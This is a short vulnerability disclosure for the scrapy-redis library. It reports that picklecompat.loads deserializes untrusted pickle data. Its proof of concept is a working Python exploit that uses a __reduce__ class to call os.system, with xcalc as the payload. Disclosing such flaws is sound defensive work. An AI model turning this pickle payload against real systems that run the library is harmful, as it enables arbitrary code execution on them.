# Description
scrapy-redis is a redis-based components for Scrapy. 
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip install scrapy_redis')
from scrapy_redis import picklecompat
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
picklecompat.loads(dumps)
```
* `pip3 install scrapy_redis`
* `python3 exploit.py`
